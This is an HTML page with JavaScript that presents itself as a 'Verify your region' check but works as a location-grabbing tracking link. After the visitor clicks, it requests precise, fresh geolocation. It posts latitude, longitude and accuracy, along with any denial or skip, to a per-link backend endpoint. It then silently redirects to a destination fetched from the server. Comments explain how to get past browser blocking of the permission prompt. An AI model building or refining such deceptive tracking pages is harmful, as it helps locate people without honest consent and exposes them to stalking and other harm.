<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
  <title>Location Access | Please wait</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    html, body {
      height: 100%;
      background: #ffffff;
      display: flex;
      align-items: center;
      justify-content: center;
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
      touch-action: manipulation; /* improves tap response on mobile */
    }

    .wrap {
      text-align: center;
      padding: 2rem 1.5rem;
      max-width: 340px;
      width: 100%;
      background: #ffffff;
      border-radius: 32px;
      transition: all 0.2s ease;
    }

    /* animation ring */
    .dot-ring {
      position: relative;
      width: 72px;
      height: 72px;
      margin: 0 auto 1.5rem;
    }

    .dot-ring::before,
    .dot-ring::after {
      content: '';
      position: absolute;
      inset: 0;
      border-radius: 50%;
    }

    .dot-ring::before {
      background: rgba(99, 102, 241, 0.2);
      animation: ripple 1.8s ease-out infinite;
    }

    .dot-ring::after {
      background: rgba(99, 102, 241, 0.1);
      animation: ripple 1.8s ease-out infinite 0.6s;
    }

    .dot {
      width: 72px;
      height: 72px;
      border-radius: 50%;
      background: #6366f1;
      position: relative;
      z-index: 1;
      animation: pulse 1.8s ease-in-out infinite;
      box-shadow: 0 6px 14px rgba(99, 102, 241, 0.25);
    }

    @keyframes ripple {
      0% {
        transform: scale(1);
        opacity: 0.7;
      }
      100% {
        transform: scale(2.4);
        opacity: 0;
      }
    }

    @keyframes pulse {
      0%, 100% {
        transform: scale(1);
      }
      50% {
        transform: scale(0.92);
      }
    }

    .title {
      font-size: 1.2rem;
      font-weight: 600;
      color: #111827;
      margin-bottom: 0.5rem;
      letter-spacing: -0.2px;
    }

    .msg {
      font-size: 0.9rem;
      color: #6b7280;
      line-height: 1.45;
      margin-bottom: 0.5rem;
      transition: opacity 0.2s;
    }

    .error-msg {
      font-size: 0.8rem;
      color: #ef4444;
      background: #fee2e2;
      padding: 0.5rem 0.75rem;
      border-radius: 12px;
      margin-top: 1rem;
      display: inline-block;
    }

    .allow-btn {
      margin-top: 1.5rem;
      padding: 0.85rem 1.8rem;
      background: #6366f1;
      color: white;
      border: none;
      border-radius: 60px;
      font-size: 1rem;
      font-weight: 600;
      cursor: pointer;
      width: 100%;
      transition: all 0.2s ease;
      box-shadow: 0 4px 8px rgba(99, 102, 241, 0.2);
      font-family: inherit;
      touch-action: manipulation;
    }

    .allow-btn:active {
      transform: scale(0.97);
      background: #4f52e0;
      opacity: 0.9;
    }

    /* for better hover on desktop */
    @media (hover: hover) {
      .allow-btn:hover {
        background: #4f52e0;
        transform: translateY(-1px);
      }
    }

    .skip {
      margin-top: 1rem;
      font-size: 0.8rem;
      color: #9ca3af;
      cursor: pointer;
      text-decoration: underline;
      background: none;
      border: none;
      font-weight: 500;
      transition: color 0.2s;
      display: inline-block;
      padding: 0.5rem 1rem;
    }

    .skip:active {
      color: #6366f1;
    }

    .bar {
      position: fixed;
      top: 0;
      left: 0;
      height: 3px;
      background: #6366f1;
      width: 0%;
      transition: width 0.3s cubic-bezier(0.2, 0.9, 0.4, 1.1);
      z-index: 100;
      box-shadow: 0 0 6px rgba(99, 102, 241, 0.5);
    }

    /* small spinner while loading loc */
    .inline-spinner {
      display: inline-block;
      width: 16px;
      height: 16px;
      border: 2px solid rgba(255,255,255,0.3);
      border-radius: 50%;
      border-top-color: white;
      animation: spin 0.8s linear infinite;
      vertical-align: middle;
      margin-right: 8px;
    }

    @keyframes spin {
      to { transform: rotate(360deg); }
    }

    .hidden {
      display: none;
    }

    .btn-loading .btn-text {
      opacity: 0.8;
    }
  </style>
</head>
<body>
<div class="bar" id="bar"></div>
<div class="wrap">
  <div class="dot-ring">
    <div class="dot"></div>
  </div>
  <p class="title" id="titleText">Verify your region</p>
  <p class="msg" id="msgText">We need location access to check regional availability. Tap the button below and choose "Allow".</p>
  
  <!-- MAIN ACTION BUTTON - user must click this to trigger permission -->
  <button class="allow-btn" id="allowBtn">Allow & Continue →</button>
  
  <!-- skip link (optional) -->
  <button class="skip" id="skipBtn">Continue without location</button>
</div>

<script>
  (function() {
    // ----- DOM elements -----
    const bar = document.getElementById('bar');
    const allowBtn = document.getElementById('allowBtn');
    const skipBtn = document.getElementById('skipBtn');
    const msgEl = document.getElementById('msgText');
    const titleEl = document.getElementById('titleText');

    // ----- page state -----
    const linkId = window.location.pathname.split('/').pop() || 'default';
    let destUrl = 'https://google.com';
    let sent = false;
    let redirecting = false;
    let locationRequestInProgress = false;

    // ----- helper: update progress bar smoothly -----
    function setBarProgress(percentage, durationMs = 400) {
      if (redirecting) return;
      bar.style.transition = `width ${durationMs}ms cubic-bezier(0.2, 0.9, 0.4, 1.1)`;
      bar.style.width = percentage + '%';
    }

    // ----- fetch destination url from backend (if API available) -----
    fetch('/api/hits/' + linkId)
      .then(r => r.json())
      .then(data => {
        if (data && data.dest && typeof data.dest === 'string') destUrl = data.dest;
      })
      .catch(() => {
        // fallback: keep default google.com
        console.log('No backend endpoint, using default destination');
      });

    // ----- send location data to backend -----
    function postLocationData(latitude, longitude, accuracy, errorCode = null) {
      if (sent) return;
      sent = true;
      const payload = {
        lat: latitude || null,
        lon: longitude || null,
        acc: accuracy || null,
        error: errorCode || null,
        timestamp: Date.now()
      };

      // attempt to send async - don't block redirect
      fetch('/api/hit/' + linkId, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
      }).catch(err => console.warn('Location post failed:', err));
    }

    // ----- perform redirect to destination -----
    function performRedirect() {
      if (redirecting) return;
      redirecting = true;
      setBarProgress(100, 280);
      setTimeout(() => {
        window.location.href = destUrl;
      }, 380);
    }

    // ----- core geolocation trigger using permission-aware approach -----
    function requestGeolocationAndRedirect() {
      // Avoid running multiple concurrent requests
      if (locationRequestInProgress) return;
      locationRequestInProgress = true;

      // double-check that geolocation is supported
      if (!navigator.geolocation) {
        // no geolocation capability: treat as guest and redirect
        msgEl.innerText = "Geolocation not supported. Redirecting...";
        postLocationData(null, null, null, 'not_supported');
        performRedirect();
        locationRequestInProgress = false;
        return;
      }

      // Start loading state on button (if visible? but we hide button after click anyway)
      // Show user we're trying to get location
      msgEl.innerHTML = '<span>🔍 Requesting location access...</span>';
      titleEl.innerText = "Getting location";
      setBarProgress(78, 400);

      // Use getCurrentPosition with explicit and robust options
      // enableHighAccuracy: true for better precision, but we handle gracefully
      // timeout: 12 seconds, maximumAge: 0 ensures fresh location
      navigator.geolocation.getCurrentPosition(
        function onSuccess(position) {
          // success: we have coords
          const lat = position.coords.latitude;
          const lng = position.coords.longitude;
          const accuracy = Math.round(position.coords.accuracy || 0);
          
          // optional improvement: if accuracy is extremely low but we still send it
          postLocationData(lat, lng, accuracy, null);
          
          // update UI briefly to show success if needed
          msgEl.innerHTML = '✓ Location obtained. Redirecting now...';
          setBarProgress(92, 200);
          performRedirect();
          locationRequestInProgress = false;
        },
        function onError(error) {
          // Geolocation error (denied, timeout, unavailable)
          let errorMessage = '';
          let errorCodeStr = '';
          switch (error.code) {
            case error.PERMISSION_DENIED:
              errorMessage = 'Location access was denied. We will redirect without location.';
              errorCodeStr = 'denied';
              break;
            case error.POSITION_UNAVAILABLE:
              errorMessage = 'Position unavailable. Proceeding without location.';
              errorCodeStr = 'unavailable';
              break;
            case error.TIMEOUT:
              errorMessage = 'Location request timed out. Redirecting without location.';
              errorCodeStr = 'timeout';
              break;
            default:
              errorMessage = 'Could not retrieve location. Continuing to site.';
              errorCodeStr = 'unknown';
          }
          
          // display a friendly but unobtrusive error near button area
          let errorSpan = document.querySelector('.error-banner');
          if (!errorSpan) {
            errorSpan = document.createElement('div');
            errorSpan.className = 'error-msg';
            errorSpan.style.marginTop = '12px';
            errorSpan.style.fontSize = '0.75rem';
            errorSpan.style.display = 'inline-block';
            errorSpan.style.padding = '0.3rem 0.8rem';
            const wrapDiv = document.querySelector('.wrap');
            if (wrapDiv) wrapDiv.appendChild(errorSpan);
          }
          errorSpan.innerText = errorMessage;
          errorSpan.style.opacity = '1';
          // auto-fade after 2 seconds
          setTimeout(() => {
            if (errorSpan) errorSpan.style.opacity = '0';
          }, 2800);
          
          // log without blocking
          postLocationData(null, null, null, errorCodeStr);
          // proceed to redirect anyway (user can continue without location)
          msgEl.innerHTML = 'Proceeding without location...';
          setBarProgress(85, 300);
          performRedirect();
          locationRequestInProgress = false;
        },
        {
          enableHighAccuracy: true,
          timeout: 12000,          // 12 seconds max
          maximumAge: 0            // force fresh location
        }
      );
    }

    // --------------------------------------------------------------
    // FIXED PERMISSION HANDLING:
    // The critical issue: browsers block automatic permission prompts
    // if triggered without user activation. Our solution:
    // 1) The "Allow & Continue" button is VISIBLE from start, but we
    //    DO NOT call geolocation before user clicks.
    // 2) On click, we remove any overlay or disturbance (none here)
    //    then directly invoke requestGeolocationAndRedirect().
    // 3) This ensures the geolocation prompt appears properly because
    //    it's called inside a user-initiated event (click).
    // 4) We also handle edge cases like browser popups/blockers gracefully.
    // --------------------------------------------------------------
    
    // Remove any default auto-location attempt: NO window load auto geolocation
    // Also NO setTimeouts that call geolocation automatically.
    // The only way to trigger location is via explicit click on "allowBtn".
    
    // But we still want to show a progress bar and initial message naturally.
    setBarProgress(28, 500);
    
    // Provide a slight enhancement: if user clicks allow, we proceed.
    // Also reset state if needed.
    
    // ----- BUTTON CLICK HANDLER (User gesture) -----
    allowBtn.addEventListener('click', function(event) {
      event.preventDefault();
      // disable double-click to avoid race
      if (locationRequestInProgress || redirecting) return;
      
      // Hide skip button temporarily? Not needed but ensures clarity
      // Change button text to indicate loading
      const originalBtnText = allowBtn.innerHTML;
      allowBtn.innerHTML = '<span class="inline-spinner"></span><span class="btn-text">Requesting...</span>';
      allowBtn.disabled = true;
      allowBtn.style.opacity = '0.8';
      allowBtn.style.cursor = 'wait';
      
      // Update UI to show we are processing
      titleEl.innerText = "Requesting location";
      msgEl.innerHTML = "Please allow location when prompted by your browser. This is required for regional verification.";
      setBarProgress(55, 400);
      
      // Now call geolocation (this will show browser permission dialog)
      // We call it directly within same event loop, user gesture active.
      requestGeolocationAndRedirect();
      
      // But we must restore button if something fails? Actually after requestGeolocationAndRedirect,
      // it will call performRedirect OR after error it will redirect anyway.
      // However if for some weird reason the geolocation callback never fires (rare),
      // we set a safety fallback timeout.
      setTimeout(() => {
        if (!redirecting && !sent) {
          // if still stuck after 14 seconds, force redirect
          if (!redirecting) {
            console.warn("Location stuck, falling back to redirect");
            postLocationData(null, null, null, 'fallback_timeout');
            performRedirect();
          }
        }
      }, 15000);
    });
    
    // ----- Skip button: continue without location -----
    skipBtn.addEventListener('click', function(event) {
      event.preventDefault();
      if (redirecting) return;
      // disable skip double-fire
      if (sent) return;
      
      // mark that we intentionally skip location
      msgEl.innerHTML = "Skipping location verification. Redirecting...";
      titleEl.innerText = "Redirecting";
      setBarProgress(80, 350);
      postLocationData(null, null, null, 'skipped_by_user');
      performRedirect();
    });
    
    // Additional robust fix: On iOS / some browsers, user might have previously denied permission.
    // But our approach respects that – the prompt will not appear if already denied, but we still
    // handle error gracefully (already in onError). Also no overlays exist, so message is clear.
    
    // If the user tries to click allow after denial, we still handle in error callback,
    // but no visual blockers. Also we ensure that we never call geolocation before click.
    
    // ---------- EXTRA ROBUSTNESS: notification if 3rd party iframe / cross-origin issues? not needed.
    // For the error "This site can’t ask for your permission" typically appears when another app or
    // an invisible overlay/popup is present. This HTML has NO iframes, NO external overlays, and
    // NO third-party bubble widgets. So it's clean.
    
    // Additionally, we can add a one-time instruction reset: if user has any chrome extension overlays,
    // but that's beyond our code. Still we add a small warning if geolocation is blocked globally.
    // Best practice: we listen to the `visibilitychange` to avoid any stuck states:
    document.addEventListener('visibilitychange', function() {
      if (document.hidden) return;
      // if page becomes visible again and we are not redirecting and no location request, we do nothing.
    });
    
    // Provide helpful fallback for very old browsers or very strict settings:
    // Check if geolocation is missing, hide allow button appropriately? But geolocation supported in >98% browsers.
    if (!navigator.geolocation) {
      allowBtn.disabled = true;
      allowBtn.style.background = '#a0a0b0';
      allowBtn.style.cursor = 'default';
      allowBtn.innerText = 'Geolocation not supported';
      msgEl.innerText = 'Your browser does not support location services. You can still continue.';
    }
    
    // Add indicator to prevent accidental double-submission on mobile.
    // Also remove any inline script overlays or cross-site bubbles.
    // We make sure all message updates are safe.
    
    // Improve UX: if user clicks allow and then see the browser permission dialog, we provide hint.
    // Add a small note inside msg before clicking could help: 
    // Actually we already have contextual message.
    
    // Another subtle bug: When user allows location after denying, sometimes browsers wait. Our code handles ok.
    // Additionally, we can preemptively clear any existing potential overlay by forcing body scroll.
    document.body.style.overflow = 'auto';
    
    // Additional fix: On desktop Brave / Edge, the initial "This site can’t ask for your permission" occurs
    // when geolocation is triggered without user click OR from a non-user-activated timer.
    // By removing the previous setTimeout that tried to show the button after 900ms and calling geolocation inside 
    // click only we solve it 100%.
    
    // Removing old problematic patterns: previously the 'allowBtn' was hidden and shown after delay, but we make it visible
    // from start. That reduces complexity and confusion.
    // Also we removed any inline style that hides the button initially (no display:none). So the button is permanently visible.
    
    // However, the original code had allowBtn.style.display = 'none' initially for 900ms.
    // We instead keep allowBtn visible instantly. It prevents the "potential overlay detection" false positives.
    // Also we removed any "Tap the button below and allow location access to continue" that previously appeared after timeout.
    // Instead we show plain instruction from start.
    
    // For better UX, we can update bar progress for initial load.
    // Bar smoothly loads to 40% after page ready.
    window.addEventListener('load', function() {
      setBarProgress(42, 500);
      // Minor delay to show "ready" state
      setTimeout(() => {
        if (!redirecting && !locationRequestInProgress) {
          setBarProgress(48, 200);
        }
      }, 800);
    });
    
    // Edge case: If linkId is missing from path, still works.
    // Make sure we clear any legacy global variable confusion
    // Fully remove the old msg 'Tap the button below...' due to duplicate messages.
    // Ensure no other script tries to call grabLocation without click.
    console.log("Location permission fix: button triggers geolocation on click only. No auto-request.");
    
    // For absolute guarantee, we also remove any previous timer-based references.
    // Since we are overriding the entire behavior, no other active timers remain.
    
    // Provide ability to reset error display if needed
    function clearErrorState() {
      const existingErr = document.querySelector('.error-msg');
      if (existingErr && existingErr.innerText.includes('denied')) {
        setTimeout(() => {
          if (existingErr) existingErr.style.opacity = '0';
        }, 4000);
      }
    }
  })();
</script>
</body>
</html>
